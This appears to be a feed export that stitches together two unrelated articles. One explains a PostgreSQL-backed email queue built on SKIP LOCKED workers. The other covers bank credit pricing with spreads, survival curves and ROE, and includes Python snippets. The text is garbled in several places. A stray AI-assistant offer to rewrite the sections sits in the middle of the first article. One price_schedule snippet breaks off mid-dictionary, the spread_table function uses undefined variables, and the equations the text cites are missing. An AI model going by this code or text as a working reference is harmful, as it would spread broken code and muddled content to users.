item.title: System Design: Turning PostgreSQL Into a Reliable Email Queue (No Redis, No Kafka, No New Infra)
item.content:encoded:
Your cron job should schedule emails, not send them.

When your application has around 8,000 users, and you need to send a weekly digest, the simplest approach is often to write a cron job that queries all users, loops through them, and sends emails through your provider. That can work at first, but as your user base grows, the approach quickly starts to break down. It becomes harder to scale, more difficult to recover from failures, and less reliable overall. At that point, it’s worth rethinking the implementation and moving to a queue-based design that can handle delivery in a more controlled and dependable way.

Then the user base grows. 80,000 users. 400,000. 1.2 million. The same cron job now runs for eleven hours. The first customer gets their email at 6:01 AM, and the last one gets it the next day at 5 PM. Sometimes the Monday run is still going when the Tuesday run kicks off, and now two processes are stepping on each other. Someone deploys mid-run and half the users get nothing, with no record of who got what.

So the cron stops sending mail entirely. Its only job is to write down who needs an email, and then it exits, in seconds, not hours. The actual sending gets done by a handful of worker processes running in parallel, each one pulling a chunk of work off a table. Postgres — the database you’re already running and backing up and trusting for everything else — is what keeps those workers from stepping on each other. Nobody sends the same email twice, and if a worker gets killed mid-batch, nothing is lost.

Why the naive cron model breaks

The pattern almost everyone starts with looks like this:

async function sendWeeklyDigest() {
  const { rows: users } = await db.query(
    `SELECT id, email FROM users WHERE digest_enabled = true`
  );
  for (const user of users) {
    await emailProvider.send({
      to: user.email,
      template: 'weekly-digest',
    });
  }
}

This is fine at the small scale and pathological at the large scale, for reasons that compound:

It’s sequential. If a send takes 300ms round-trip to your email provider, one million emails take ~83 hours. Even at 100ms, you’re at 27+ hours. The math is unforgiving.

It’s a single long-lived process. A process that runs for hours is exposed to everything: deploys, node restarts, OOM kills, and network blips. And when it dies at email 412,006, you have no idea where it died. Restart it, and you either resend to 412,006 people or skip everyone.

It has no memory. All states live in a loop variable. There’s no answer to “did user 8812 get the email?” other than grepping provider logs.

Runs overlap. When execution time exceeds the cron interval, run N+1 starts while run N is still alive. Now you have two processes iterating the same user list. So, some users get the digest twice.

Fairness collapses. The gap between the first and last recipient grows linearly with your user base. For a marketing email that’s annoying. For “your payment failed, act within 24 hours,” it’s a real problem.

None of these are bugs in the code. They’re consequences of the architecture: one process owns the entire job, holds all the state in memory, and has to finish or fail as a unit.

What actually makes it faster is not the DB

One thing needs to be said explicitly, because it’s the most common misconception when people see this design:

Writing rows into a Postgres table does not make email sending faster. Parallelism does.

If your only problem is throughput, you can solve it inside the cron process today:

const users = await getUsers();
const CONCURRENCY = 50;
for (let i = 0; i < users.length; i += CONCURRENCY) {
  const chunk = users.slice(i, i + CONCURRENCY);
  await Promise.allSettled(chunk.map(u => emailProvider.send(u)));
}

Fifty concurrent sends instead of one. That alone could turn 27 hours into 30–40 minutes. No schema changes, no workers, nothing.

So why bother with the database at all, if a Promise.allSettled fixes the speed problem in five lines? Because speed was never the only thing wrong with the original cron job. The in-process version is faster, sure, but it's the same fragile process underneath. It still lives and dies as one unit, it still has no record of who actually got the email, and two overlapping runs will still double-send. At the end, nothing survives a crash, and nothing can be queried mid-flight to see how it's going.

The database-backed version is chosen for durability and observability, not raw throughput. That constraint is what’s forcing the architecture, and speed just happens to come along for free once the work is spread across workers. Keep that straight, because it changes how you should judge everything that follows.

Why not just use a real queue?

Let’s be upfront: the tools built for this problem are more scalable and more advanced than anything in this article. pg-boss, BullMQ on Redis, SQS, Kafka: each of them, in the right context, is a better queue than a hand-rolled Postgres table. The question is never “is Kafka more capable than my table,” because it obviously is. The question is what each option costs you, right now, given where your system already is.

pg-boss is the closest neighbor to this design. It’s literally this pattern (Postgres + SKIP LOCKED) packaged as a library, with retries, backoff, scheduling, and archiving already built. If third-party job libraries are allowed in your codebase, it's the strongest alternative here. In our case, they weren't, and we needed a solution fast: no dependency review, no new framework owning a critical path, just SQL and code we fully control. That constraint, not any weakness of pg-boss, is what put it out of reach.

SQS (+ Lambda or ECS workers) is a genuinely great fit if you’re already deep in AWS. If your services run there, IAM is set up, and the team lives in that ecosystem, SQS gives you a managed, effectively infinitely scalable queue with better delivery characteristics than a Postgres table will ever have. Take it. But if you’re not already on that infrastructure, adopting it just for email means wiring IAM roles, dead-letter queues, VPC access back to your database, and a local dev story for all of it. That’s a project, not a fix.

Redis + BullMQ is fast and pleasant, when Redis is already part of your architecture. If it isn’t, you’re introducing a whole new stateful service for one feature: provisioning, persistence configuration (get it wrong, and a restart eats your queue), memory monitoring, failover, and one more thing on the on-call rotation. For a system with no Redis anywhere, that’s a real extra complication for a problem Postgres could already carry.

Kafka, for this problem, is even more overcomplicated. It’s built for high-throughput event streaming, replayable logs, and many independent consumer groups: a different category of problem. Standing up a Kafka cluster to fan out a nightly email batch is using a freight train to deliver a pizza. If you already run Kafka for event streaming, sure, an email topic is cheap. Standing it up for this isn’t.

On top of the per-tool math, some environments add blanket constraints: fixed approved-component lists in banks, healthcare, and on-prem deployments; compliance reviews where every new service is a new attack surface, and recipient email addresses in a Redis instance become a data-handling question someone has to answer.

So the argument is narrower than “queues bad”: when the advanced options are unavailable or disproportionate, and you already run, back up, monitor, and trust PostgreSQL, the database can carry a work queue surprisingly far. This isn’t a hack, either; FOR UPDATE SKIP LOCKED was added to Postgres 9.5 largely for this pattern.

The architecture

The core shift is a separation of responsibilities:

Cron / scheduler. Runs on schedule, creates a campaign record, bulk-inserts one recipient row per user, and exits. Total runtime: seconds, even for millions of users. It never talks to the email provider.

email_campaigns. One row per logical send ("Weekly digest 2026-07-06"). Holds metadata and overall status.

email_recipients. The work queue. One row per (campaign, user). Each row carries its own status, attempt count, and lock timestamp. This table is the entire coordination mechanism.

Workers. Ordinary long-running Node processes, run 1 or run 20, on one machine or several. Each worker loops: claim a batch of pending rows, send, record the outcome, repeat. Workers don’t know about each other. Postgres row locks handle coordination.

Email provider. SES, SendGrid, Postmark, whatever. Unchanged.

The good part is that workers are stateless and interchangeable. Killing one loses nothing. Adding one requires no reconfiguration. The database is the single source of truth for what’s done, what’s in flight, and what failed.

How the Database schema is configured

UNIQUE (campaign_id, user_id) is the duplicate guardrail.
If the cron job accidentally runs twice — because of a redeploy, a manual trigger, or some other operational mistake — the second insert for the same user in the same campaign simply conflicts and does nothing. That one constraint removes an entire class of “we emailed everyone twice” failures before they can happen.

The recipient email is snapshotted into the row on purpose.
Users change email addresses. If workers had to join back to the users table at send time, the address used could drift from the one that existed when the campaign was queued. Storing the email directly in email_recipients makes each row self-contained: workers can send without extra lookups, and an audit months later still shows the exact address that campaign targeted.

The pending index is partial because workers only care about pending rows.
Claim queries should not get slower just because the table has accumulated millions of historical sent rows. Indexing only status = 'pending' keeps the hot path small and focused, so workers can continue finding the next batch quickly even when the table itself has grown huge.

The status column acts as a visible state machine.
A row starts as pending, moves to sending, and eventually becomes either sent or failed. On retry, it can move from sending back to pending. That lifecycle is simple, explicit, and queryable by anyone with SQL access. It also makes operational visibility almost free: a progress dashboard is just a GROUP BY status.

The cron job now is just a scheduler

The cron job no longer loops through users and sends emails itself. It creates the campaign, inserts the recipient rows, and leaves delivery to the worker pool.


import { pool } from './db.js';

export async function scheduleWeeklyDigest() {
  const client = await pool.connect();
  try {
    await client.query('BEGIN');

    const { rows: [campaign] } = await client.query(
      `INSERT INTO email_campaigns (name, template_key, status, scheduled_at)
       VALUES ($1, $2, 'processing', now())
       RETURNING id`,
      [`weekly-digest-${new Date().toISOString().slice(0, 10)}`, 'weekly_digest']
    );

    // One INSERT ... SELECT. No loop, no per-user round trips.
    // 2M users -> one statement, a few seconds.
    const { rowCount } = await client.query(
      `INSERT INTO email_recipients (campaign_id, user_id, email)
       SELECT $1, u.id, u.email
       FROM users u
       WHERE u.digest_enabled = true
         AND u.email_verified = true
       ON CONFLICT (campaign_id, user_id) DO NOTHING`,
      [campaign.id]
    );

    await client.query('COMMIT');
    console.log(`Campaign ${campaign.id}: enqueued ${rowCount} recipients`);
  } catch (err) {
    await client.query('ROLLBACK');
    throw err;
  } finally {
    client.release();
  }
}

Note what this does not do: it doesn’t touch the email provider, doesn’t loop over users in application code, and doesn’t stay alive. It converts “send emails” into data, and data is durable.

The workers

Here is a complete worker. It runs forever, claiming and processing batches until there’s nothing left, then idles:


import { pool } from './db.js';
import { sendEmail } from './email-provider.js';

const BATCH_SIZE  = 50;
const MAX_ATTEMPTS = 3;
const IDLE_MS      = 5_000;

async function claimBatch() {
  const { rows } = await pool.query(
    `WITH claimed AS (
       SELECT id
       FROM email_recipients
       WHERE status = 'pending'
       ORDER BY id
       LIMIT $1
       FOR UPDATE SKIP LOCKED
     )
     UPDATE email_recipients r
     SET status     = 'sending',
         locked_at  = now(),
         attempts   = r.attempts + 1,
         updated_at = now()
     FROM claimed
     WHERE r.id = claimed.id
     RETURNING r.id, r.campaign_id, r.user_id, r.email, r.attempts`,
    [BATCH_SIZE]
  );
  return rows;
}

async function markSent(id) {
  await pool.query(
    `UPDATE email_recipients
     SET status = 'sent', sent_at = now(), locked_at = NULL, updated_at = now()
     WHERE id = $1`,
    [id]
  );
}

async function markFailedOrRetry(id, attempts, err) {
  if (attempts >= MAX_ATTEMPTS) {
    await pool.query(
      `UPDATE email_recipients
       SET status = 'failed', failed_reason = $2, locked_at = NULL, updated_at = now()
       WHERE id = $1`,
      [id, String(err).slice(0, 500)]
    );
  } else {
    await pool.query(
      `UPDATE email_recipients
       SET status = 'pending', locked_at = NULL, updated_at = now()
       WHERE id = $1`,
      [id]
    );
  }
}

async function processRow(row) {
  try {
    await sendEmail({ to: row.email, campaignId: row.campaign_id });
    await markSent(row.id);
  } catch (err) {
    await markFailedOrRetry(row.id, row.attempts, err);
  }
}

async function run() {
  console.log(`worker ${process.pid} started`);
  while (true) {
    const batch = await claimBatch();
    if (batch.length === 0) {
      await new Promise(r => setTimeout(r, IDLE_MS));
      continue;
    }
    await Promise.allSettled(batch.map(processRow));
  }
}

run().catch(err => {
  console.error('worker crashed:', err);
  process.exit(1);
});

Workers can be scaled however you want — run node worker.js five times, under systemd, in separate containers, or across multiple machines. The rest of the system doesn’t need to know how many workers exist.

The important design choices are:

  • Claim jobs atomically. A single SQL statement selects pending rows, locks them, and updates them to sending before the transaction commits. That removes the gap where a row could be chosen by one worker but still appear pending to another.
  • Mark as sending before sending the email. This avoids the worse failure mode. If a worker sent the email first and crashed before updating the row, the job would still look pending and could be sent again. With mark-first, a crash leaves the row stuck in sending, which can later be safely reclaimed and retried. In practice, a delayed email is usually preferable to a duplicate one.
  • Increment attempts at claim time. That way, even if the worker crashes mid-send, the attempt is still counted. It also prevents “poisoned” rows—jobs that consistently crash a worker—from being retried forever without limit.

How multiple workers claim rows without collisions

This is what makes multiple workers safe.

With plain FOR UPDATE, if Worker 1 locks rows 1–50, every other worker trying to claim pending rows will wait behind it. So even with 10 workers, they end up moving one at a time.

SKIP LOCKED fixes that. If a worker hits rows already locked by someone else, it skips them and keeps going.

So instead of everyone fighting over rows 1–50:

  • Worker 1 takes 1–50
  • Worker 2 takes 51–100
  • Worker 3 takes 101–150

That’s what lets multiple workers claim jobs from the same table in parallel without stepping on each other.

You don’t need custom coordination logic for this. Postgres is doing the coordination for you. If a worker crashes, its transaction rolls back, its locks disappear, and those rows become claimable again automatically.

Each worker doesn’t get “the true first 50 pending rows.” It gets the first 50 rows nobody else has locked yet. For a queue, that’s exactly what you want.

The only caveat is that SKIP LOCKED skips any locked rows, not just ones locked by other workers. So if some admin script or backfill holds locks on pending rows for too long, workers may temporarily see less work than actually exists.

What happens when a worker crashes

Row locks only protect the claim step itself. Once a worker commits its claim, the rows are permanently marked as sending and the locks are gone.

So if a worker crashes after claiming a batch but before finishing the sends, those rows don’t automatically recover. They just sit in sending with no active worker attached to them.

That’s what locked_at is for. If a row has been in sending for far longer than a normal batch should take, you can treat it as abandoned and move it back to pending.

UPDATE email_recipients
SET status = 'pending',
    locked_at = NULL,
    updated_at = now()
WHERE status = 'sending'
  AND locked_at < now() - interval '10 minutes';

Pick the timeout with intent: it must be comfortably longer than any legitimate batch could take (batch size × worst-case send latency, with margin).

If a reclaimed row keeps crashing workers, attempts prevents it from looping forever. Each time it’s claimed again, the counter goes up. Once it hits MAX_ATTEMPTS, the row is marked failed with a reason and drops out of the queue. That’s your poison-pill protection.

The bigger win is operational: a worker crash stops being an incident. Stuck rows get reclaimed automatically, other workers keep draining the queue, and you can restart the dead process whenever convenient.

Overlapping campaigns

Overlapping campaigns stop being a problem in this model.
Campaign A and campaign B create different rows, because they have different campaign_id values. That means they never conflict, even if both target the same user.

SELECT r.id
FROM email_recipients r
JOIN email_campaigns c ON c.id = r.campaign_id
WHERE r.status = 'pending' AND c.status = 'processing'
ORDER BY c.priority DESC, r.id
LIMIT $1
FOR UPDATE OF r SKIP LOCKED

Workers also don’t care which campaign a row belongs to. They just keep claiming pending rows. So if Tuesday’s campaign starts while Monday’s is still running, the worker pool simply processes both at the same time.

That’s a real queueing feature, priorities, added with one column and one ORDER BY. Try getting that change through a message-broker deployment as quickly.

How fast this actually gets

A sequential cron job sending 1 million emails can take days. A small worker pool cuts that down to minutes, because email delivery is mostly waiting on the provider, not doing CPU-heavy work.

In practice, the first limit you’ll usually hit isn’t Postgres — it’s your email provider’s rate limit. The database is mostly doing small status updates as rows move through pending, sending, and sent or failed, which is relatively cheap compared to the actual network calls.

So the main tuning knobs are worker count and batch size. Start with something simple, like 4 workers with batches of 50, measure it, and adjust from there. For this kind of workload, the provider is usually the bottleneck long before the database is.

If you want, I can do one last pass over all the rewritten sections together so they read in one consistent Medium/article voice instead of section-by-section patches.

Why not just chunk users in cron?

If speed is genuinely the whole requirement, chunking users into arrays inside cron (the exact code shown earlier) works fine, and it’s a lot less code than everything above. For a few tens of thousands of recipients, in a system where a botched run just gets re-run, that’s probably the right call. It would be dishonest to pretend otherwise.

Conclusion

The fix for the eleven-hour cron job was not making the loop faster. It was changing the model.

Cron stopped being the process that sends emails and became the process that schedules them: create the campaign, insert the recipient rows, and exit. From there, a pool of workers picks up those rows and sends in parallel. That parallelism is what turns delivery from an hours-long sequential job into something that can finish in minutes.

PostgreSQL is what makes that safe. The queue lives in ordinary tables, every email has a visible state, failed work can be retried, and FOR UPDATE SKIP LOCKED lets multiple workers claim different batches without stepping on each other.

So the optimization here was bigger than “make cron faster.” It was moving email delivery out of cron, turning PostgreSQL into the queue, and letting worker parallelism do the heavy lifting.

Pricing credit under time, risk, and survival dynamics

After some time working with the lending cycle in Brazilian banks, one key question came to mind:

How can we introduce microeconomic principles to properly price the interest rate that should be offered to a potential borrower, given their risk profile?

This article aims to address this question by discussing fundamental concepts in financial mathematics, including compound interest, amortization (Price system), funding cost, spread, breakeven, default risk, expected profit and loss, and the survival of the contract.

For those familiar with my work, I will also incorporate Python to build a simulator capable of optimizing how much banks should charge as a risk premium for their lending activity.

I divide this article into two parts. The first one explains everything the reader needs to know regarding how banks should lend their money. The second one builds a Python class to work on a synthetic database and generate the pricing for new customers.

But first things first.

We will approach this by:

  • Explaining key mathematical and financial concepts such as the interest rate, Price (French amortization) system, spread and cost of funding, breakeven, risk, expected losses and recovery, contract survival and more.
  • Providing basic Python code to explain and illustrate the concepts.
  • Building a simulator that works on synthetic data to estimate the probability of default and how much we should price the loan (Part 2).
  • Applying the simulator to predict the revenue from new customers (Part 2).

Compound Interest

A bank lends money today and expects to receive more in the future. The mechanism that governs this exchange is compound interest, defined by Equation 1:

Where:

  • PV is the present value (amount lent).
  • FV is the future value (amount received).
  • i is the interest rate.
  • n is the number of periods.

This equation encodes a simple idea:

Money today is worth more than money tomorrow.

In a frictionless world, this would be enough. A bank could simply lend at a rate (i), wait (n) periods, and receive (FV) considering the borrower will pay with certainty.

Putting Equation 1 into numbers, lets assume:

  • The reader is borrowing $1,000 from the bank (PV).
  • The reader will pay back in twelve months (n).
  • The bank will charge 2% interest per month.

The future value (FV) is given by the capitalization of that borrowed money, Equation 2:

Thus, the total amount the bank receives once the contract is fully settled is $1,268.24.

We can slightly rearrange Equation 1. By dividing FV by PV, we isolate the compound growth factor driven by the interest rate of 2% per month.

In other words, the ratio 1.268241 is generated by compounding a 2% monthly interest rate over 12 periods.

If we subtract the principal, we obtain the net return, which represents the investment’s profitability, 26.82% over the period, Equation 3.

All this material is mainly covered in financial mathematics textbooks, so I’m not making it more complicated than it needs to be.

We see that from the initial operation, the bank made a 26.82% out of it, that is how profitable the operation was.

In fact, in the real world, things go slightly south.
We’ll get to that later.

So far, banks treat the interest rate as compensation for the risk of lending money. In this view, the higher the rate (i), the higher the profitability.

Price (French Amortization) System

Now let’s move on to how banks offer money to customers. This operation is formalized through a contract, commonly referred to as consumer credit, in which the bank grants a loan and the customer repays it over time in installments.

All contracts are defined by a set of core elements:

  • The number of installments (n).
  • A loan principal (PV).
  • The interest component (i) embedded in each installment.
In most cases, borrowers have little clarity about the total amount they are actually paying over the life of the contract.

There are several amortization systems used to structure these loans (e.g., Price system, SAC, and mixed schemes), but here we focus on the Price (French amortization) system, as it is the most widely used in retail credit.

In the Price system, the value of each installment (Pₜ) is composed of two parts:

  • Interest component (Iₜ).
  • Principal amortization (Aₜ).

Their summation gives us the amount of each installment (Pₜ), constant over time, meaning the customer always pays back the same amount of money in each period until the contract is liquidated.

Now the interest component always incides on the previous total balance (Bₜ₋₁), Equation 4:

So that, as the outstanding balance decreases over time, the interest component also decreases, and the borrower gradually pays less interest in each installment.

The principal amortization (Aₜ)​ is obtained by subtracting the interest component (Iₜ)​ from the fixed installment (Pₜ)​, Equation 5:

The balance (Bₜ) is given by subtracting from the previous balance (Bₜ₋₁) the principal amortization (Aₜ)​, Equation 6. below:

We need to determine how much the customer is paying in each installment. We derive the fixed installment P by imposing that the present value of all future payments must equal the principal PV.

In other words, the loan is priced such that the value of the incoming cash flows, when discounted at the interest rate i, exactly matches the amount lent today.

This leads to Equation 7, below:

All hands on Math!

Following up, we now have all we need to calculate the price system for any given operation.

Let’s assume we are the bank and we lend under the same conditions mentioned above: $1,000 (PV), 12 installments, and 2% interest per month.

First, we compute the fixed installment (P):

Then we compute interest from the previous balance (Bₜ₋₁), which is exactly the money lent (PV), Equation 9:

Next, we subtract the interest from the fixed installment P to obtain the amortization A₁, Equation 10.

Finally, from the original PV, which corresponds to Bₜ₋₁ in the first period, we compute the remaining balance after amortization, which defines the principal to be carried into the next period, as shown in Equation 11:

Then we repeat the process until the 12th installment, and if we do the computations correctly, the remaining balance (B₁₂) at the end is zero.

We have now covered the initial concepts of financial mathematics. Next, let’s put everything together in Python to compute and generate the cash flow of any given price system.

import pandas as pd

def price_schedule(pv, rate, n_periods):
    installment = pv * rate / (1 - (1 + rate) ** (-n_periods))
    
    schedule = []
    balance = pv

    schedule.append({
        "period": 0,
        "installment": 0.0,
        "interest": 0.0,
        "amortization": 0.0,

Spread and Cost of Funding

In credit pricing, the interest rate charged to the borrower is not arbitrary. It is built on top of the bank’s own cost of capital, which reflects how much the institution pays to fund its operations, and an additional spread, which represents compensation for risk, liquidity, and profit margin.

Intuitively, the bank borrows money from investors (most commonly through instruments such as securities and debentures) and lends this capital to customers, who are the actual end users of the funds.
The difference between the cost of obtaining this money and the rate at which it is lent defines is the spread.

Formally, the interest rate can be decomposed as:

Where:

  • i is the loan interest rate,
  • c is the cost of funding (cost of capital),
  • s is the credit spread.

From a cash flow perspective, each installment in the Price system embeds this rate into the valuation of the contract.

In other words, the each installment (Pₜ) carries a part of the cost structure of the bank and its remunaration.

Let’s assume the bank funds itself by paying investors a base interest rate plus an annual premium. The lending rate, when converted to a monthly rate i, must exceed the cost of capital c by a spread s.

Breakeven

In credit operations, the breakeven point represents the condition under which the present value of expected cash inflows exactly equals the cost of funding the loan.

At this point, the operation generates zero economic profit, meaning the spread is fully offset by expected losses and funding costs.

By looking at Table 1, we can intuitively identify the breakeven point as the moment when the sum of all paid installments exceeds the principal.

More formally, breakeven occurs when the cumulative cash inflow equals the initial disbursed amount, Equation 13:

It can be obtained in python by summing installments overtime and checking when the cumulative cashflows exceed the principal (PV).

Let’s add the previous code a few lines:

def price_schedule(pv, rate, n_periods):
    installment = pv * rate / (1 - (1 + rate) ** (-n_periods))
    
    schedule = []
    balance = pv
    cumulative_cf = 0.0 # cumulative cashflow
    breakeven_hit = False

    schedule.append({
        "period": 0,
        "installment": 0.0,
        "interest": 0.0,
        "amortization": 0.0,
        "balance": balance,
        "cashflow_cumulative": 0.0,
        "breakeven": False
    })

    for t in range(1, n_periods + 1):
        interest = rate * balance
        amortization = installment - interest
        balance = balance - amortization

        cumulative_cf += installment

        if not breakeven_hit and cumulative_cf >= pv:
            breakeven_hit = True

        schedule.append({
            "period": t,
            "installment": installment,
            "interest": interest,
            "amortization": amortization,
            "balance": balance,
            "cashflow_cumulative": cumulative_cf,
            "breakeven": breakeven_hit
        })

    return pd.DataFrame(schedule).round(2)

Risk

At this point, the concept of risk becomes central. Any contract carries an intrinsic uncertainty about whether the borrower will pay more than the breakeven point or default before reaching it.

There are several ways of analyzing risk, but here we focus on default risk, a situation in which the customer stops repaying the bank. This event can occur at any period over the life of the contract.

The break-even point is just a rule of thumb that indicates whether, at the moment the customer stopped paying, the contract had already generated profit or resulted in a loss.

At my job, I work with machine learning models to evaluate risk, yet complex, they all follow a basic framework:

  1. We define a target problem (here, the probability of default).
  2. We build features that help explain that problem.
  3. We train a model that learns a function mapping known features to the probability of that event occurring.
  4. Finally, we classify all contracts into risk bands, which we call ratings.

We are not interested here in how to build a model, but in the final step of classification. That said, there are many features that can help explain the probability of a customer not paying us back:

Some examples include borrower income level, debt-to-income ratio, historical payment behavior, credit bureau scores, employment stability, utilization of existing credit lines, and past delinquency or default history, age, sex, region and many others.

Survival of the Contract

Pricing the spread correctly demands we consider risk in the price system we discussed above.

We do that by estimating the survival of the contract — the probability that a loan remains active (i.e., the borrower continues paying) over time. To understand this, we use survival curves, which show how this probability evolves across periods.

At each period, the contract either survives or defaults. If we define PD ​ as the probability of default at time t, then the probability of surviving that period is given by Equation 16 :

The survival of the contract up to time t, denoted S(t), is the probability that the contract has not defaulted in any previous period. This is computed as the product of all survival probabilities up to that point, Equation 17:

This means that survival decreases over time as the risk of default accumulates. Each period’s default risk compounds, reducing the likelihood that the contract remains active.

As intuitive as the concept is, it becomes harder to visualize when time is introduced. Previously, PD was treated as a static measure by rating (A to E), but now we incorporate the key idea that risk evolves over time.

The longer the contract horizon (i.e., the greater the number of installments), the higher the cumulative probability that the customer defaults before reaching breakeven.

For simplification, we model default as a time-dependent process in which a contract has a total probability of default over a fixed horizon T, denoted by PD (See Table 3).

This total risk is decomposed into period-by-period events through a constant hazard rate h, Equation 18, which represents the conditional probability of default in period t, given survival up to that point.

We are distributing the total default probability over time using a constant hazard rate, so that the sum of period-by-period default events equals the total PD.
In real life, however, these probabilities are not given by a hazard rate. We’ll cover that later.

Now we can write some code that gives an intuitive look at the survival of the contract:


import numpy as np

def hazard_survival_curve(pd_total=0.10, n_periods=12, n_contracts=10000):
    h = 1 - (1 - pd_total) ** (1 / n_periods)

    period = np.arange(0, n_periods + 1)
    survival = (1 - h) ** period
    PDt = np.r_[0.0, survival[:-1] * h]

    defaults = np.rint(PDt * n_contracts).astype(int)
    survivors = n_contracts - np.cumsum(defaults)

    df = pd.DataFrame({
        "period": period,
        "hazard %": np.round(h * 100, 2),
        "survival %": np.round(survival * 100, 2),
        "PDt %": np.round(PDt * 100, 2),
        "defaults": defaults,
        "survivors": survivors
    }).set_index("period")

    return df

import numpy as np
import pandas as pd

def hazard_survival_curve(pd_total=0.10, n_periods=12, n_contracts=10000, hazard_type='exponential'):
    if hazard_type == 'exponential':
        h = 1 - (1 - pd_total) ** (1 / n_periods)
    elif hazard_type == 'weibull':
        k = 1.5
        lambda_param = (-np.log(1 - pd_total)) ** (1/k) / n_periods
        h = lambda_param * k * (lambda_param * 1) ** (k - 1)  # hazard at t=1
    else:
        raise ValueError("hazard_type must be 'exponential' or 'weibull'")

    period = np.arange(0, n_periods + 1)
    
    if hazard_type == 'exponential':
        survival = (1 - h) ** period
        PDt = np.r_[0.0, survival[:-1] * h]
        hazard_series = np.full(n_periods + 1, h)
        hazard_series[0] = 0.0
    else:  # weibull
        survival = np.exp(-(lambda_param * period) ** k)
        PDt = np.r_[0.0, survival[:-1] - survival[1:]]
        hazard_series = np.r_[0.0, lambda_param * k * (lambda_param * period[:-1]) ** (k - 1)]

    defaults = np.rint(PDt * n_contracts).astype(int)
    survivors = n_contracts - np.cumsum(defaults)

    df = pd.DataFrame({
        "period": period,
        "hazard %": np.round(hazard_series * 100, 2),
        "survival %": np.round(survival * 100, 2),
        "PDt %": np.round(PDt * 100, 2),
        "defaults": defaults,
        "survivors": survivors
    }).set_index("period")

    return df

Expected Loss Spread

Now we have all the pieces to optimize the spread at least to breakeven. That means every $1.00 of loans is supported by a risk model, and the spread we charge is calibrated to cover expected losses.

We will observe realized losses, since contracts will continue to default in practice, but the pricing ensures that, in expectation, the portfolio remains profitable by charging each operation the minimum required spread to offset credit risk.

The money the bank loses is covered by the revenues that all contracts generate.
Thus, we achieve predictable revenue.

The formula to take expected losses into consideration when calculating the spread, Equation 20, is depicted below:

  • s is the minimum spread required to cover expected losses.
  • PDₜ​ is the probability of default at period t.
  • LGD is the loss given default.
  • Bₜ​ is the outstanding balance (EAD) at period t.
  • T is the total number of periods.

The core idea is that part of the spread covers risk, and the other part ensures business profitability by shifting the spread upward. This works essentially as a securitization mechanism, defining the spread that at least covers the expected losses.

Keeping it at this breakeven level guarantees competitiveness, but expected revenues would be zero, since the spread only covers losses, with no margin for profit.

Yes, the whole paper is a minimization problem.
God save the long-dead microeconomists!

However, banks should make money, so they must define a portion of the spread as the profit required by the business — and this additional component is mainly the expected return on the operation.

If they do so, competitiveness is slightly sacrificed, but since the price they charge reflects the products and services they offer, and therefore, the quality and quantity of customers they acquire.

Now, one thing is important: even though the risk increases with time, the outstanding balance Bₜ​ decreases with each installment. This brings us a counterintuitive result:

We are essentially assuming that longer contracts are riskier than shorter ones. However, as the number of installments increases, the average outstanding balance decreases over time.

When we compute the weighted average spread, which is weighted by Bₜ​ (See Equation 20), the resulting breakeven spread ends up being lower for longer contracts.

Why?
Because the spread is not calculated per period; it is a single spread applied to the entire contract.

The formula averages the expected losses over the entire life of the loan, weighted by the outstanding balance. Since the balance declines over time, the losses in later periods carry less weight, reducing the overall spread.

In other words:

  • Longer contracts → more time for risk to accumulate → higher PDₜ​.
  • But also → more periods with low outstanding balance → lower weighted average loss.
  • The latter effect dominates → breakeven spread decreases with contract length.

This is not a flaw. It is a direct consequence of defining the spread as a constant rate applied to the declining balance.

Finally, let’s calculate the breakeven spread for ratings A to E, considering this new survival curve, and update our pricing table.

First we need a python function that calculates the spread (s):


def expected_loss_spread(default_probability, n_periods=12, loss_given_default=0.45, hazard_type='weibull'):
    df = hazard_survival_curve(default_probability, n_periods, n_contracts=10000, hazard_type=hazard_type)
    PDt = df['PDt %'].values / 100
    Bt = np.array([n_periods - t + 1 for t in range(n_periods + 1)]) / n_periods
    Bt[0] = 0
    expected_loss = PDt * loss_given_default * Bt
    s = np.sum(expected_loss[1:]) / np.sum(Bt[1:])
    return round(s * 10000, 2) # bps 100 bps = 1,00% p.m.

def spread_table(ratings, loss_given_default=0.45, max_periods=12, hazard_type='weibull'):
    results_bps = {}
    results_annualized = {}
    for t in range(1, max_periods + 1):

        results_annualized[t] = {}
        for rating, default_probability in ratings.items():

            results_bps[t][rating] = round(s_bps, 2)
            
            # Converte para % a.a. (juros compostos mensais)
            s_decimal = s_bps / 10000
            s_annualized = (1 + s_decimal) ** 12 - 1
            results_annualized[t][rating] = round(s_annualized * 100, 2)
    
    df_bps = pd.DataFrame(results_bps).T
    df_bps.index.name = 'Installments'

    df_annualized.index.name = 'Installments'
    df_annualized.columns = [f'{r}_p.a.' for r in ratings.keys()]

So far, we have determined how the offer should be made by the representative, considering that the spread is 100% driven by risk optimization.

where:

  • i is the loan interest rate.
  • c is the cost of funding.
  • sₑₗ is the expected loss spread.
  • r is the required profitability or the premium

Now, r is defined by the business itself, and it may vary according to risk if deemed profitable. However, with that, the framework no longer minimizes the interest rate, which violates our assumptions in all previous sections.

There is a way to calculate r based on the desired ROE (Return on Equity) and leverage.

ROE is simply the return the bank generates on the money its shareholders have invested. It is one of the most important metrics in banking because it tells investors how efficiently their capital is being used. A 20% ROE, for example, means that for every $100 of shareholder capital the bank generates $20 in profits.

Leverage, on the other hand, represents the bank’s ability to fund a loan portfolio that is larger than its own equity base, by using deposits and other raised funds.

Let’s make this concrete. Suppose the bank has R$ 10 billion available to lend. Of this total, R$ 2 billion is the bank’s own capital, and the remaining R$ 8 billion comes from investors — deposits, savings, and other funding sources. This means the bank is operating with a leverage of 5x.

If the bank earns a 2% return on the R$ 10 billion it lends, it generates R$ 200 million in profit. But that R$ 200 million is earned on only R$ 2 billion of its own capital, which translates into a 10% return on equity.

Without leverage, the same 2% return would have yielded only R$ 40 million on the bank’s own R$ 2 billion.

With that in mind, the required profitability can be derived in Equation 22:

where:

  • ROE is the target return on equity (e.g., 20% per year),
  • Leverage is the ratio of total assets to equity (e.g., 5×).

In our framework, leverage is the mechanism that translates the required profitability premium (r) into a viable return for shareholders, ensuring that the bank’s lending activity remains both competitive and financially sustainable.

We can write the function r_table to do the job for us:

def r_table(roe_values, leverage_values):
    data = []
    for lev in leverage_values:
        row = []
        for roe in roe_values:
            row.append(roe / lev)
        data.append(row)
    
    df = pd.DataFrame(
        data,
        index=[f"{lev:.1f}x" for lev in leverage_values],
        columns=[f"{roe*100:.0f}%" for roe in roe_values]
    )
    df.index.name = "Leverage"
    df.columns.name = "ROE"
    
    return (df * 100).round(2)

# call
r_table(
    roe_values=[0.10, 0.12, 0.15, 0.18, 0.20, 0.25, 0.30],
    leverage_values=[5.0, 6.7, 8.3, 10.0, 12.5, 16.7, 20.0]
)

Running it will produce the Table 9, below:

